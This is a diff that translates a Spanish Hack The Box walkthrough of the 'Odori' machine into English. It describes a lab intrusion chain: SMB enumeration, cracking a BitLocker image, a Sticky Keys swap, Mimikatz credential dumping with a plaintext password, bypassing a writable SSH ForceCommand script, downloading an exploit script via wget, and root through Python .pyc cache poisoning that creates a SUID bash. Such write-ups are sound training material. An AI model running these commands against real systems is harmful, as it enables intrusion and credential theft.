@@ -1,64 +1,63 @@
-# **Hack The Box — Odori | Walkthrough**
+# Hack The Box — Odori | Walkthrough
 
-Linux / Windows
+**Platform:** Hack The Box  
+**Operating Systems:** Linux / Windows  
+**Key Technologies:** SMB, SFTP, SSH, Python  
+**Objective:** Initial Access, Privilege Escalation, User and Root Flags
 
-SMB
+## 1. Introduction
 
-SFTP
+In this walkthrough, I will document the process of compromising the **Odori** machine on Hack The Box, from initial enumeration to obtaining root privileges.
 
-Privilege Escalation
+The machine combines digital forensics, credential recovery, SSH restriction bypass techniques, and privilege escalation through Python bytecode cache manipulation.
 
-## **1. Introducción**
+**Objective:** Gain access to the target system, compromise the `svc_backup` account, escalate privileges to `root`, and retrieve the `user.txt` and `root.txt` flags.
 
-En este walkthrough documentaré el proceso de resolución de la máquina **Odori** de Hack The Box, desde la enumeración inicial hasta la obtención de privilegios de administrador (`root`).
+### Techniques Used
 
-La máquina combina técnicas de análisis forense, recuperación de credenciales, evasión de restricciones SSH y escalada de privilegios mediante la manipulación de archivos compilados de Python.
-
-**Objetivo:** obtener acceso al sistema, comprometer la cuenta `svc_backup`, escalar privilegios a `root` y recuperar las flags `user.txt` y `root.txt`.
-
-### **Técnicas utilizadas**
-
-- Enumeración de servicios con Nmap.
-- Enumeración de recursos compartidos SMB.
-- Análisis de una imagen VMDK cifrada con BitLocker.
-- Recuperación de credenciales de Windows.
-- Bypass de restricciones SSH mediante SFTP.
-- Identificación de tareas programadas ejecutadas como root.
+- Service enumeration using Nmap.
+- SMB share enumeration.
+- Analysis of a BitLocker-encrypted VMDK disk image.
+- Windows credential recovery.
+- Bypassing SSH restrictions through SFTP.
+- Identifying scheduled tasks running with root privileges.
 - Python Bytecode Cache Poisoning (`.pyc`).
 
-Los pasos iniciales de análisis forense se presentan como ruta de referencia; en nuestra conversación comprobamos directamente el acceso por SFTP, la modificación de `restrict` y la escalada final.
+The initial forensic analysis steps are presented as a reference approach. During my own exploitation process, I directly verified SFTP access, modification of the `restrict` script, and the final privilege escalation.
 
-## **2. Reconocimiento y enumeración**
+---
 
-### **2.1 Escaneo de puertos**
+## 2. Reconnaissance and Enumeration
 
-Comenzamos identificando los servicios expuestos por la máquina objetivo.
+### 2.1 Port Scanning
 
-```
+We begin by identifying the services exposed by the target machine.
+
+```bash
 nmap -sC -sV -Pn -p- 10.129.183.7 -oN nmap.txt
 ```
 
-Los principales servicios identificados fueron:
+The main services identified were:
 
-| Puerto  | Servicio | Descripción              |
-| ------- | -------- | ------------------------ |
-| 22/tcp  | SSH      | OpenSSH 8.9p1            |
-| 139/tcp | NetBIOS  | Servicio de compartición |
-| 445/tcp | SMB      | Samba                    |
+| Port | Service | Description |
+|---|---|---|
+| 22/tcp | SSH | OpenSSH 8.9p1 |
+| 139/tcp | NetBIOS | File-sharing service |
+| 445/tcp | SMB | Samba |
 
-La presencia de SMB sugiere que debemos investigar los recursos compartidos para identificar posibles archivos expuestos.
+The presence of SMB suggests that we should investigate shared resources to identify potentially exposed files.
 
-### **2.2 Enumeración de SMB**
+### 2.2 SMB Enumeration
 
-Podemos utilizar NetExec para comprobar si el servidor permite acceder sin credenciales.
+We can use NetExec to check whether the server allows unauthenticated access.
 
-```
+```bash
 nxc smb 10.129.183.7 -u '' -p '' --shares
 ```
 
-Entre los recursos compartidos aparece:
+The available shares include:
 
-```
+```text
 Share       Permissions
 -----       -----------
 print$
@@ -66,70 +65,66 @@ backup      READ
 IPC$
 ```
 
-El recurso `backup` permite lectura, por lo que podemos acceder con:
+The `backup` share allows read access, so we can connect using:
 
-```
+```bash
 smbclient //10.129.183.7/backup -N
 ```
 
-Dentro encontramos el archivo `info.txt`, que contiene una referencia a la imagen de disco VMDK proporcionada en la descripción de la máquina.
+Inside the share, we find an `info.txt` file containing a reference to the VMDK disk image provided in the machine description.
 
-**Hallazgo:** el acceso inicial está relacionado con el análisis de una copia de seguridad de Windows, no con la explotación directa de un servicio web.&#x20;
+**Finding:** The initial access path involves analyzing a Windows backup rather than directly exploiting a web service.
 
+---
 
-ExploitNotes
+## 3. Forensic Analysis and Credential Recovery
 
+### 3.1 VMDK Disk Image Analysis
 
+We download the disk image provided by Hack The Box and extract its contents:
 
-## **3. Análisis forense y recuperación de credenciales**
-
-### **3.1 Análisis de la imagen VMDK**
-
-Descargamos la imagen proporcionada por HTB y extraemos su contenido:
-
-```
+```bash
 7z x odori.7z
 ```
 
-Comprobamos el formato del disco:
+Next, we inspect the disk image format:
 
-```
+```bash
 file file02.vmdk
 qemu-img info file02.vmdk
 ```
 
-El análisis de particiones revela una instalación de Windows con una partición principal protegida mediante BitLocker.
+Partition analysis reveals a Windows installation with its main partition protected by BitLocker.
 
-Para recuperar la contraseña de cifrado, extraemos los hashes:
+To recover the encryption password, we extract the hashes:
 
-```
+```bash
 bitlocker2john -i file02.vmdk > vm-hash
 ```
 
-A continuación, utilizamos John the Ripper con el diccionario `rockyou.txt`:
+We then use John the Ripper with the `rockyou.txt` wordlist:
 
-```
+```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt vm-hash
 ```
 
-La contraseña recuperada en el es: `********************`.
+The recovered password is:
 
-Esto permite desbloquear el disco, pero todavía necesitamos acceder a una cuenta de Windows.&#x20;
-
-
-ExploitNotes
-
-
-
-### **3.2 Acceso a Windows mediante WinRE**
-
-Creamos una máquina virtual utilizando una copia del archivo VMDK y configuramos su red en modo aislado (*Host-only*).
-
-Posteriormente, arrancamos con una ISO de instalación de Windows y accedemos a las opciones de recuperación.
-
-Desde la consola de recuperación identificamos el volumen:
-
+```text
+********************
 ```
+
+This allows us to unlock the encrypted disk. However, we still need to gain access to a Windows account.
+
+### 3.2 Accessing Windows Through WinRE
+
+We create a virtual machine using a copy of the VMDK file and configure its network adapter in an isolated environment (*Host-only*).
+
+Next, we boot the virtual machine using a Windows installation ISO and access the recovery options.
+
+From the recovery command prompt, we identify the appropriate volume:
+
+```powershell
 diskpart
 list volume
 select volume 1
@@ -137,360 +132,388 @@ assign letter=E
 exit
 ```
 
-Desbloqueamos BitLocker:
+We then unlock BitLocker:
 
-```
+```powershell
 manage-bde -unlock E: -pw
 ```
 
-Una vez desbloqueado, el procedimiento aprovecha la función Sticky Keys para obtener una consola SYSTEM en el inicio de sesión.
+Once the partition is unlocked, we take advantage of the Windows Sticky Keys accessibility feature to obtain a SYSTEM command prompt from the login screen.
 
-```
+```powershell
 copy E:\Windows\System32\sethc.exe E:\Windows\System32\sethc.exe.bak
 copy E:\Windows\System32\cmd.exe E:\Windows\System32\sethc.exe
 ```
 
-Al reiniciar Windows y presionar `Shift` cinco veces en la pantalla de inicio de sesión, se abre una consola de comandos con privilegios SYSTEM.
+After restarting Windows and pressing `Shift` five times at the login screen, a command prompt with SYSTEM privileges becomes available.
 
-### **3.3 Extracción de credenciales**
+### 3.3 Credential Extraction
 
-Una vez dentro de Windows, utilizamos Mimikatz para examinar las credenciales almacenadas:
+Once we have access to Windows, we use Mimikatz to inspect stored credentials:
 
-```
+```text
 privilege::debug
 token::elevate
 lsadump::sam
 ```
 
-Aunque se obtienen hashes NTLM, estos no proporcionan directamente el acceso deseado al servidor Linux.
+Although NTLM hashes can be extracted, they do not directly provide the access required to compromise the Linux server.
 
-La pista importante aparece en las credenciales asociadas a tareas programadas de Windows.
+An important clue appears in the credentials associated with Windows scheduled tasks.
 
-```
+```text
 vault::list
 vault::cred /patch
 ```
 
-La contraseña recuperada corresponde a la cuenta:
+The recovered credentials belong to the following account:
 
+```text
+Username: svc_backup
+Password: Napping2Curator
 ```
-Usuario: svc_backup
-Contraseña: Napping2Curator
-```
 
-Esta cuenta se utiliza en una tarea de respaldo mediante SFTP, por lo que constituye el siguiente objetivo para conseguir acceso al servidor Linux.&#x20;
+This account is used by a scheduled backup task that communicates through SFTP, making it our next target for obtaining access to the Linux server.
 
+---
 
-ExploitNotes
+## 4. Initial Access Through SFTP
 
+### 4.1 Restricted SSH Connection
 
+We first attempt to establish an SSH connection:
 
-## **4. Acceso inicial mediante SFTP**
-
-### **4.1 Conexión SSH restringida**
-
-Intentamos conectarnos:
-
-```
+```bash
 ssh svc_backup@10.129.183.7
 ```
 
-Sin embargo, aunque las credenciales sean válidas, el servidor restringe las sesiones SSH interactivas.
+However, even with valid credentials, the server restricts interactive SSH sessions.
 
-Por ello, probamos con SFTP:
+Therefore, we attempt an SFTP connection instead:
 
-```
+```bash
 sftp svc_backup@10.129.183.7
 ```
 
-La conexión SFTP nos permite enumerar archivos y directorios del sistema.
+The SFTP connection allows us to enumerate files and directories on the target system.
 
-### **4.2 Identificación de la restricción**
+### 4.2 Identifying the Restriction
 
-Descargamos la configuración SSH:
+We download the SSH configuration file:
 
-```
+```text
 sftp> get /etc/ssh/sshd_config
 ```
 
-Encontramos una configuración similar a:
+We discover a configuration similar to:
 
-```
+```text
 Match group svc_backup
     ForceCommand /opt/restrict /home/%u
     AllowTcpForwarding no
 ```
 
-El parámetro `ForceCommand` obliga a ejecutar `/opt/restrict` independientemente del comando solicitado por el cliente.
+The `ForceCommand` directive forces the execution of `/opt/restrict`, regardless of the command requested by the SSH client.
 
-Al inspeccionar el script encontramos:
+After inspecting the script, we find:
 
-```
+```bash
 #!/bin/bash
 
 /usr/lib/openssh/sftp-server -d $1
 ```
 
-Es decir, cada nueva conexión se redirige al servidor SFTP y no a una terminal interactiva.
+This means that every new connection is redirected to the SFTP server instead of an interactive shell.
 
-### **4.3 Modificación de&#x20;**`restrict`
+### 4.3 Modifying `restrict`
 
-La vulnerabilidad consiste en que el usuario `svc_backup` puede modificar el archivo que controla su propia restricción.
+The vulnerability exists because the `svc_backup` user can modify the script responsible for enforcing its own SSH restrictions.
 
-Creamos una versión modificada:
+We create a modified version of the script:
 
-```
+```bash
 nano restrict
 ```
 
-Contenido:
+Contents:
 
-```
+```bash
 #!/bin/bash
 
 #/usr/lib/openssh/sftp-server -d $1
 bash
 ```
 
-Después cargamos el archivo mediante SFTP:
+We then upload the modified file through SFTP:
 
-```
+```text
 sftp> put restrict /opt/restrict
 ```
 
-En mi caso, la transferencia se completó:
+In my case, the transfer completed successfully:
 
-```
+```text
 Uploading restrict to /opt/restrict
 restrict 100% 54 0.2KB/s 00:00
 ```
 
-Con esta modificación, el comando forzado deja de ejecutar el servidor SFTP y pasa a iniciar Bash.
+With this modification, the forced command no longer starts the SFTP server. Instead, it launches Bash.
 
-### **4.4 Obtención de una terminal**
+### 4.4 Obtaining an Interactive Shell
 
-Iniciamos una nueva conexión:
+We establish a new SSH connection:
 
-```
+```bash
 ssh -tt svc_backup@10.129.183.7
 ```
 
-Una vez obtenida la terminal, verificamos el usuario:
+Once an interactive shell becomes available, we verify the current user:
 
-```
+```bash
 whoami
 id
 ```
 
-Resultado de referencia:
+Expected output:
 
-```
+```text
 uid=1001(svc_backup) gid=1001(svc_backup) groups=1001(svc_backup)
 ```
 
-Ya tenemos acceso al servidor Linux, aunque todavía sin privilegios de administrador.
+We now have access to the Linux server, although we do not yet have administrative privileges.
 
-**Vulnerabilidad identificada:** configuración insegura de `ForceCommand`, debido a que el script de restricción es modificable por el propio usuario restringido.&#x20;
+**Identified Vulnerability:** An insecure `ForceCommand` configuration allows the restricted user to modify the script responsible for enforcing the SSH restriction.
 
+---
 
-ExploitNotes
+## 5. Retrieving user.txt
 
+After gaining access to the `svc_backup` account, we can locate the first flag.
 
-
-## **5. Obtención de user.txt**
-
-Con acceso a la cuenta `svc_backup`, podemos localizar la primera flag.
-
-```
+```bash
 ls -la /home/svc_backup/
 ```
 
-La ubicación esperada es:
+The expected location is:
 
-```
+```text
 /home/svc_backup/user.txt
 ```
 
-Para leerla:
+To read the flag:
 
-```
+```bash
 cat /home/svc_backup/user.txt
 ```
 
-## **6. Escalada de privilegios a root**
+---
 
-Esta es la parte más importante de la máquina, porque aprovecha el funcionamiento interno de la caché de bytecode de Python.
+## 6. Privilege Escalation to Root
 
-### **6.1 Enumeración de privilegios**
+This is the most interesting part of the machine because it exploits the internal behavior of Python's bytecode caching mechanism.
 
-Comenzamos comprobando los permisos del usuario:
+### 6.1 Privilege Enumeration
 
-```
+We begin by checking the current user's permissions:
+
+```bash
 sudo -l
 ```
 
-También buscamos binarios con SUID:
+We also search for binaries with the SUID permission bit enabled:
 
-```
+```bash
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-Como no encontramos un camino útil mediante `sudo`, investigamos procesos y tareas automatizadas.
+Since we do not find a useful privilege escalation path through `sudo`, we investigate running processes and automated tasks.
 
-El análisis mediante `pspy` identifica un proceso que se ejecuta periódicamente con privilegios de root:
+Using `pspy`, we identify a process that periodically runs with root privileges:
 
-```
+```text
 UID=0 | python3 /opt/archiver/app.py
 ```
 
-Este proceso se ejecuta aproximadamente cada minuto.
+This process runs approximately every minute.
 
-### **6.2 Análisis de&#x20;**`/opt/archiver`
+### 6.2 Analyzing `/opt/archiver`
 
-Inspeccionamos el directorio:
+We inspect the application directory:
 
-```
+```bash
 ls -la /opt/archiver/
 ```
 
-Se muestra estos elementos relevantes:
+The relevant files and directories include:
 
-```
+```text
 app.py
 helper.py
 __pycache__/
 ```
 
-La aplicación importa una función de `helper.py`:
+The application imports a function from `helper.py`:
 
-```
+```python
 from helper import tar_and_move_files
 ```
 
-El proceso se encarga de revisar archivos antiguos de `/backup` y archivarlos en `/archive`.
+The process is responsible for identifying old files in `/backup` and archiving them in `/archive`.
 
-Sin embargo, el directorio `__pycache__` posee permisos de escritura accesibles para usuarios no privilegiados.
+However, the `__pycache__` directory has write permissions accessible to unprivileged users.
 
-**Esto significa que un usuario puede sustituir archivos de bytecode que posteriormente serán cargados por un proceso ejecutado como root.**
+**This means an unprivileged user can replace Python bytecode files that may later be loaded by a process running as root.**
 
-### **6.3 Python Bytecode Cache Poisoning**
+### 6.3 Python Bytecode Cache Poisoning
 
-Python utiliza archivos `.pyc` para almacenar bytecode previamente compilado.
+Python uses `.pyc` files to store previously compiled bytecode.
 
-Flujo de la escalada mediante la modificación de la caché de Python.
+These files help improve module-loading performance by allowing Python to reuse compiled code when its cache validation checks succeed.
 
-El archivo vulnerable es:
+The vulnerable file is:
 
-```
+```text
 /opt/archiver/__pycache__/helper.cpython-310.pyc
 ```
 
-El ataque consiste en crear una versión modificada del bytecode que conserve una cabecera válida para el archivo `helper.py`.
+The attack involves creating a modified bytecode file while preserving a valid header that matches the original `helper.py` source file.
 
-Cuando la tarea programada ejecuta `app.py`, Python importa el módulo y ejecuta el código alterado con los privilegios del proceso.
+When the scheduled task executes `app.py`, Python imports the module and executes the modified bytecode with the privileges of the running process.
 
-Se confirma que la validación basada en fecha de modificación y tamaño del código fuente permite reutilizar un `.pyc` manipulado sin modificar directamente `helper.py`.&#x20;
+The timestamp-based validation mechanism, which relies on source-file modification time and size, makes it possible to reuse a manipulated `.pyc` file without directly modifying `helper.py`.
 
-ExploitNotes
+The resulting exploitation chain is:
 
-
-
-### **6.4 Automatización de la escalada**
-
-Para evitar realizar manualmente todas las modificaciones del bytecode, utilizamos el script `odori_privesc.py` preparado durante la resolución.
-
-En Parrot OS iniciamos un servidor HTTP:
-
+```text
+svc_backup
+    |
+    v
+Writable __pycache__ directory
+    |
+    v
+Modified helper.cpython-310.pyc
+    |
+    v
+Root-owned scheduled task
+    |
+    v
+Python imports malicious bytecode
+    |
+    v
+Code execution with root privileges
 ```
+
+### 6.4 Automating Privilege Escalation
+
+#### Instalation
+```
+git clone https://github.com/TraceVoid/HTB/machine/Odori/odori_privesc.py
+```
+
+To avoid manually modifying the bytecode and its header, we use the `odori_privesc.py` script prepared during the exploitation process.
+
+On Parrot OS, we start a temporary HTTP server:
+
+```bash
 python3 -m http.server 8000 --bind 0.0.0.0
 ```
 
-Desde la sesión `svc_backup` descargamos el script:
+From the `svc_backup` shell, we download the script:
 
-```
+```bash
 wget http://IP_TUN0:8000/odori_privesc.py -O /tmp/odori_privesc.py
 ```
 
-Posteriormente:
+We then execute it:
 
-```
+```bash
 python3 /tmp/odori_privesc.py
 ```
 
-El propósito del script es automatizar la preparación y sustitución del bytecode de Python para que la tarea ejecutada como root genere una copia de Bash con permisos SUID.
+The script automates the preparation and replacement of Python bytecode so that the scheduled task running as root creates a SUID-enabled copy of Bash.
 
-El procedimiento utiliza `/tmp/rootbash` como ruta para esa copia privilegiada.
+The resulting privileged binary is expected to be created at:
 
-### **6.5 Obtención de root**
-
-Una vez que la tarea programada ejecuta el bytecode manipulado, verificamos el archivo:
-
+```text
+/tmp/rootbash
 ```
+
+### 6.5 Obtaining Root Privileges
+
+Once the scheduled task executes the modified bytecode, we check whether the privileged binary has been created:
+
+```bash
 ls -l /tmp/rootbash
 ```
 
-El indicador esperado es un binario propiedad de root con el bit SUID activado:
+The expected result is a binary owned by root with the SUID bit enabled:
 
-```
+```text
 -rwsr-xr-x 1 root root ... /tmp/rootbash
 ```
 
-Ejecutamos:
+We execute the binary using:
 
-```
+```bash
 /tmp/rootbash -p
 ```
 
-Y verificamos los privilegios:
+Next, we verify our privileges:
 
-```
+```bash
 id
 ```
 
-El resultado esperado incluye:
+The expected output includes:
 
-```
+```text
 euid=0(root)
 ```
 
-Es importante señalar que `uid` puede seguir siendo el del usuario `svc_backup`, pero `euid=0` confirma que la shell está ejecutándose con privilegios efectivos de root.
+It is important to understand that the real user ID (`uid`) may still belong to `svc_backup`, while the effective user ID (`euid=0`) confirms that the shell is running with root privileges.
 
-## **7. Obtención de root.txt**
+---
 
-Una vez obtenida la shell privilegiada, buscamos la flag final.
+## 7. Retrieving root.txt
 
-```
+After obtaining a privileged shell, we locate the final flag.
+
+```bash
 ls -la /root/
 ```
 
-Para leerla:
+We then read it:
 
-```
+```bash
 cat /root/root.txt
 ```
 
-En caso de desconocer su ubicación:
+If the flag is not located in the expected directory, we can search the entire filesystem:
 
-```
+```bash
 find / -type f -name "root.txt" 2>/dev/null
 ```
 
-Con la lectura de `root.txt`, se completa el objetivo de la máquina.
+Retrieving `root.txt` completes the machine.
 
-## **8. Resumen de la cadena de ataque**
+---
 
-1. **Enumeración:** descubrimiento de SSH y SMB.
-2. **Acceso a archivos:** recurso SMB `backup` con lectura anónima.
-3. **Análisis forense:** extracción y descifrado de una imagen VMDK protegida por BitLocker.
-4. **Recuperación de credenciales:** obtención de la contraseña de `svc_backup` desde Windows.
-5. **Acceso inicial:** conexión SFTP y bypass de `ForceCommand` mediante `/opt/restrict`.
-6. **Escalada de privilegios:** manipulación de `helper.cpython-310.pyc` para aprovechar una tarea cron de root.
-7. **Objetivo final:** shell privilegiada y recuperación de `root.txt`.
+## 8. Attack Chain Summary
 
-## **9. Conclusión personal**
+1. **Enumeration:** Identified exposed SSH and SMB services.
+2. **File Access:** Discovered an anonymously readable SMB backup share.
+3. **Digital Forensics:** Extracted and decrypted a BitLocker-protected VMDK disk image.
+4. **Credential Recovery:** Recovered the credentials of the `svc_backup` account from Windows.
+5. **Initial Foothold:** Established SFTP access and bypassed SSH `ForceCommand` restrictions by modifying `/opt/restrict`.
+6. **Privilege Escalation:** Manipulated `helper.cpython-310.pyc` to exploit a scheduled task running with root privileges.
+7. **Final Objective:** Obtained a privileged shell and retrieved the `root.txt` flag.
 
-La máquina Odori me permitió comprender mejor cómo una serie de configuraciones inseguras pueden combinarse hasta comprometer completamente un sistema. Una de las partes más interesantes fue descubrir que, aunque una cuenta estuviera limitada a utilizar SFTP, era posible evadir esta restricción debido a los permisos incorrectos del script encargado de controlar el acceso SSH.
+---
 
-Sin embargo, el aprendizaje más importante estuvo en la escalada de privilegios. Antes de resolver esta máquina no había profundizado demasiado en el funcionamiento de los archivos `.pyc` ni en cómo Python utiliza su caché para optimizar las importaciones. Comprendí que proteger únicamente los archivos de código fuente no es suficiente si otros componentes que utiliza una aplicación privilegiada pueden ser modificados por usuarios sin autorización.
+## 9. Lessons Learned
 
-También reforcé la importancia de analizar procesos automatizados, permisos de directorios y relaciones entre servicios, en lugar de depender exclusivamente de exploits conocidos. Esta máquina demuestra que la enumeración detallada y la comprensión del funcionamiento de un sistema son fundamentales durante una evaluación de seguridad.
+The Odori machine helped me gain a better understanding of how multiple security misconfigurations can be chained together to fully compromise a system. One of the most interesting aspects was discovering that, even though an account was restricted to SFTP access, it was possible to bypass this limitation because of incorrect file permissions on the script responsible for enforcing SSH restrictions.
+
+However, the most valuable learning experience came from the privilege escalation phase. Before working on this machine, I had not explored the internal behavior of Python `.pyc` files in much detail or how Python uses cached bytecode to optimize module imports. I learned that protecting source code alone is not sufficient if other components used by privileged applications can be modified by unauthorized users.
+
+I also reinforced the importance of carefully analyzing automated processes, directory permissions, and interactions between system components instead of relying exclusively on known exploits. This machine demonstrates that thorough enumeration and a solid understanding of how operating systems and applications work are essential skills during a penetration testing engagement.
